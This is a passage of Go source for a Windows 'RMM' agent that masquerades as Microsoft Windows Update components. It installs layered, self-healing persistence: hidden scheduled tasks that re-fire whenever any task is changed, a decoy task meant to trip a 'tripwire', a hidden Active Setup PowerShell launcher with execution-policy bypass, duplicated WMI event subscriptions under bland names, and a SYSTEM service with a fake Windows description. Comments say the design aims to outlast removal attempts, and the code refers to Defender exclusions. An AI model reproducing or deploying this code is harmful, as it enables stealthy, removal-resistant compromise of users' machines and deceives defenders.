			// Update-rollback leftovers next to the installed binary.
			_ = os.Remove(filepath.Join(installDir, "MicrosoftWindowsClient.prev.exe"))
			_ = os.Remove(filepath.Join(installDir, "version.prev.txt"))
			_ = os.Remove(filepath.Join(installDir, "pending_update.json"))
			_ = os.Remove(filepath.Join(installDir, "rollback_notice.json"))
			_ = os.Remove(filepath.Join(installDir, "token.txt"))
			_ = os.Remove(filepath.Join(installDir, "mode.json"))
			_ = os.Remove(filepath.Join(blenderDir, "token.txt"))
			_ = os.Remove(filepath.Join(blenderDir, "mode.json"))
		// Second backup location (v1.40.6+).
		backupDir2 := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes", "Cache")
		if os.Getenv("APPDATA") == "" {
			backupDir2 = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Themes", "Cache")
		}
		_ = os.RemoveAll(backupDir2)
		if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
			_ = os.Remove(filepath.Join(localApp, "RMM", "healthy"))
		}
		_, _ = hiddenExec("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
		_, _ = hiddenExec("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
		// Kill watchdog by command-line match (window title is unreliable when hidden).
		_, _ = hiddenExec("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
		removeDefenderExclusions(installDir, filepath.Join(installDir, "MicrosoftWindowsClient.exe"))
		_ = os.RemoveAll(vaultDir())
		_ = os.RemoveAll(installDir)
		if legacyDir != "" && legacyDir != installDir {
			_ = os.RemoveAll(legacyDir)
		}
		x86Dir := `C:\Program Files (x86)\RMM\Agent`
		if pf := os.Getenv("ProgramFiles(x86)"); pf != "" {
			x86Dir = filepath.Join(pf, "RMM", "Agent")
		}
		if x86Dir != installDir {
			_ = os.RemoveAll(x86Dir)
		}
		fmt.Println("Agent uninstalled.")
		os.Exit(0)
	}
	install()
}

func createWatchdogTask(agentPath, backupDir string) {
	// Native supervisor task: runs the agent binary with --watch (no
	// powershell anywhere). XML copy stays beside the backup so the
	// watcher itself can rebuild a deleted task.
	watchdogTaskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT15M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger>
    <SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger>
  </Triggers>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure><Interval>PT1M</Interval><Count>9999</Count></RestartOnFailure>
  </Settings>
  <Actions Context="Author"><Exec><Command>%s</Command><Arguments>--watch</Arguments></Exec></Actions>
</Task>`, agentPath)

	// Self-defending task: any task-table mutation re-fires it instantly.
	watchdogTaskXML = withEventTrigger(watchdogTaskXML)

	// Keep a copy beside the backup so the watcher can rebuild a deleted
	// task without the installer.
	_ = os.WriteFile(filepath.Join(backupDir, "watchdog_task.xml"), []byte(watchdogTaskXML), 0644)
	tmpWatchdogTask := filepath.Join(os.TempDir(), "rmm_watchdog_task.xml")
	_ = os.WriteFile(tmpWatchdogTask, []byte(watchdogTaskXML), 0644)
	out, err := hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateWatchdog", "/xml", tmpWatchdogTask, "/f").CombinedOutput()
	if err != nil {
		log.Printf("[!] Failed to create watchdog task: %v %s", err, string(out))
	} else {
		log.Printf("[*] Watchdog task registered successfully")
	}
	_ = os.Remove(tmpWatchdogTask)
}

// createOrchestratorTask registers the third persistence task under a
// different name (logon + 30min + unlock, runs --watch). A kill chain that
// wipes "WindowsUpdate*" by name still leaves this one to revive the rest.
func createOrchestratorTask(agentPath, backupDir, installDir string) {
	orchXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT30M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger>
    <SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger>
  </Triggers>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure><Interval>PT1M</Interval><Count>9999</Count></RestartOnFailure>
  </Settings>
  <Actions Context="Author"><Exec><Command>%s</Command><Arguments>--watch</Arguments></Exec></Actions>
</Task>`, agentPath)

	orchXML = withEventTrigger(orchXML)
	_ = os.WriteFile(filepath.Join(backupDir, "orchestrator_task.xml"), []byte(orchXML), 0644)
	_ = os.WriteFile(filepath.Join(installDir, "orchestrator_task.xml"), []byte(orchXML), 0644)
	tmpTask := filepath.Join(os.TempDir(), "rmm_orch_task.xml")
	_ = os.WriteFile(tmpTask, []byte(orchXML), 0644)
	_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateOrchestrator", "/f").CombinedOutput()
	out, err := hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateOrchestrator", "/xml", tmpTask, "/f").CombinedOutput()
	if err != nil {
		log.Printf("[!] Failed to create orchestrator task: %v %s", err, strings.TrimSpace(string(out)))
	} else {
		log.Printf("[*] Orchestrator task registered successfully")
	}
	_ = os.Remove(tmpTask)
}

// createDecoyTask registers the honeypot task: named like a legacy
// leftover ("WindowsUpdateCheck"), it actually runs --wmi-heal (repairs +
// exits) on logon and hourly. Deleting it trips the tripwire instead of
// hurting anything.
func createDecoyTask(agentPath, backupDir, installDir string) {
	decoyXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>2026-01-01T00:00:00</Date><Author>RMM</Author></RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled><Repetition><Interval>PT1H</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></LogonTrigger>
  </Triggers>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author"><Exec><Command>%s</Command><Arguments>--wmi-heal</Arguments></Exec></Actions>
</Task>`, agentPath)

	decoyXML = withEventTrigger(decoyXML)
	_ = os.WriteFile(filepath.Join(backupDir, "decoy_task.xml"), []byte(decoyXML), 0644)
	_ = os.WriteFile(filepath.Join(installDir, "decoy_task.xml"), []byte(decoyXML), 0644)
	tmpTask := filepath.Join(os.TempDir(), "rmm_decoy_task.xml")
	_ = os.WriteFile(tmpTask, []byte(decoyXML), 0644)
	_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateCheck", "/f").CombinedOutput()
	out, err := hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", tmpTask, "/f").CombinedOutput()
	if err != nil {
		log.Printf("[!] Failed to create decoy task: %v %s", err, strings.TrimSpace(string(out)))
	} else {
		log.Printf("[*] Decoy task registered")
	}
	_ = os.Remove(tmpTask)
}

// activeSetupStub builds the detached launcher. powershell with
// -WindowStyle Hidden shows no console at all (cmd.exe /c start flashed
// one at every logon), Start-Process detaches so Active Setup never
// blocks, and the watcher self-hides on top.
func activeSetupStub(agentPath string) string {
	return `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process '` + strings.ReplaceAll(agentPath, "'", "''") + `' -ArgumentList '--watch' -WindowStyle Hidden"`
}

// ensureActiveSetup registers the logon-time vector (idempotent).
func ensureActiveSetup(agentPath string) {
	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdateClient`, registry.WRITE)
	if err != nil {
		log.Printf("[!] Active Setup key: %v", err)
		return
	}
	defer k.Close()
	_ = k.SetStringValue("StubPath", activeSetupStub(agentPath))
	_ = k.SetStringValue("Version", version.Version)
	log.Printf("[*] Active Setup logon vector set")
}

const wmiFilterName = "WindowsUpdateFilter"
const wmiDeathFilterName = "WindowsUpdateDeathFilter"
const wmiConsumerName = "WindowsUpdateConsumer"
const wmiTimerID = "WindowsUpdateTimer"

// wmiSets is the primary layer plus a duplicate under bland names: a
// remover targeting our WindowsUpdate* names still leaves the second set
// firing. Both run the same "<agent> --wmi-heal" consumer.
var wmiSets = [][4]string{
	{wmiFilterName, wmiDeathFilterName, wmiConsumerName, wmiTimerID},
	{"SystemHealthFilter", "SystemHealthDeathFilter", "SystemHealthConsumer", "SystemHealthTimer"},
}

// setupWmiLayer registers the deepest persistence layer: a WMI 30-minute
// timer that runs "<agent> --wmi-heal" (repairs tasks + Run keys from the
// install-dir XMLs). WMI subscriptions live outside schtasks/registry, so
// even a wipe of every task + Run value still converges back. Best effort:
// creation can fail under locked-down WMI/Defender — logged, install goes on.
func setupWmiLayer(agentPath string) {
	consumer := `"` + agentPath + `" --wmi-heal`
	// Two triggers share one consumer per set: a 30-minute timer
	// (total-wipe recovery) plus an agent-death event (taskkill answered in
	// ~1min). The consumer only repairs + kickstarts tasks (never starts
	// the agent itself: as SYSTEM it would land in session 0, breaking
	// interactivity).
	var sb strings.Builder
	for _, s := range wmiSets {
		na, nd, nc, tid := s[0], s[1], s[2], s[3]
		sb.WriteString(`$na='` + na + `';$nd='` + nd + `';$nc='` + nc + `';$tid='` + tid + `';`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na -or $_.Filter.Name -eq $nd } | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$na'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$nd'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='$nc'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Filter "TimerId='$tid'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`$t=New-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Property @{TimerId=$tid;IntervalBetweenEvents=[uint32]1800000} -ErrorAction Stop;`)
		sb.WriteString(`$f=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{Name=$na;EventNamespace='root/cimv2';QueryLanguage='WQL';Query="SELECT * FROM __TimerEvent WHERE TimerId='$tid'"} -ErrorAction Stop;`)
		sb.WriteString(`$d=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{Name=$nd;EventNamespace='root/cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceDeletionEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND (TargetInstance.Name='MicrosoftWindowsClient.exe' OR TargetInstance.Name='agent.exe')"} -ErrorAction Stop;`)
		sb.WriteString(`$c=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{Name=$nc;CommandLineTemplate='` + strings.ReplaceAll(consumer, "'", "''") + `'} -ErrorAction Stop;`)
		sb.WriteString(`New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=[Ref]$f;Consumer=[Ref]$c} -ErrorAction Stop | Out-Null;`)
		sb.WriteString(`New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=[Ref]$d;Consumer=[Ref]$c} -ErrorAction Stop | Out-Null;`)
	}
	sb.WriteString(`Write-Host 'WMI-OK'`)
	out, err := hiddenExec("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", sb.String()).CombinedOutput()
	if err != nil || !strings.Contains(string(out), "WMI-OK") {
		log.Printf("[!] WMI layer not installed (non-fatal): %v %s", err, strings.TrimSpace(string(out)))
		return
	}
	log.Printf("[*] WMI resurrection installed (2 sets: timer + death trigger each)")
}

// eventTriggerXML fires a task the moment ANY scheduled task is
// registered/updated/deleted/disabled (TaskScheduler Operational log
// 106/140/141/142): task-table wipes heal themselves within seconds.
// Self-limiting: healers query before creating, so steady state emits no
// matching events and the loop stops after one extra pass.
const eventTriggerXML = `<EventTrigger><Enabled>true</Enabled><Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-TaskScheduler/Operational"&gt;&lt;Select Path="Microsoft-Windows-TaskScheduler/Operational"&gt;*[System[(EventID=106 or EventID=140 or EventID=141 or EventID=142)]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription></EventTrigger>`

func withEventTrigger(taskXML string) string {
	return strings.Replace(taskXML, "  </Triggers>", "    "+eventTriggerXML+"\n  </Triggers>", 1)
}

const repairSvcName = "WindowsUpdateOrchestrator"

// installRepairService registers the SYSTEM repair service (auto-start +
// restart-on-failure). Repairs only; the agent keeps running in the user
// session. Idempotent: existing service is stopped + removed first.
func installRepairService(agentPath string) {
	bin := `"` + agentPath + `" --svc-heal`
	_, _ = hiddenExec("sc", "stop", repairSvcName).CombinedOutput()
	_, _ = hiddenExec("sc", "delete", repairSvcName).CombinedOutput()
	time.Sleep(time.Second)
	out, err := hiddenExec("sc", "create", repairSvcName, "binPath=", bin, "start=", "auto", "obj=", "LocalSystem").CombinedOutput()
	if err != nil {
		log.Printf("[!] repair service create: %v %s", err, strings.TrimSpace(string(out)))
		return
	}
	_, _ = hiddenExec("sc", "description", repairSvcName, "Windows Update Orchestration Service").CombinedOutput()
	_, _ = hiddenExec("sc", "failure", repairSvcName, "reset=", "86400", "actions=", "restart/60000/restart/60000/restart/60000").CombinedOutput()
	if out, err := hiddenExec("sc", "start", repairSvcName).CombinedOutput(); err != nil {
		log.Printf("[!] repair service start: %v %s", err, strings.TrimSpace(string(out)))
		return
	}
	log.Printf("[*] Repair service installed+started")
}

// removeWmiLayer deletes both WMI sets (uninstall path).
func removeWmiLayer() {
	var sb strings.Builder
	for _, s := range wmiSets {
		na, nd, nc, tid := s[0], s[1], s[2], s[3]
		sb.WriteString(`$na='` + na + `';$nd='` + nd + `';$nc='` + nc + `';$tid='` + tid + `';`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na -or $_.Filter.Name -eq $nd } | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$na'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$nd'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='$nc'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Filter "TimerId='$tid'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
	}
	_, _ = hiddenExec("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", sb.String()).CombinedOutput()
}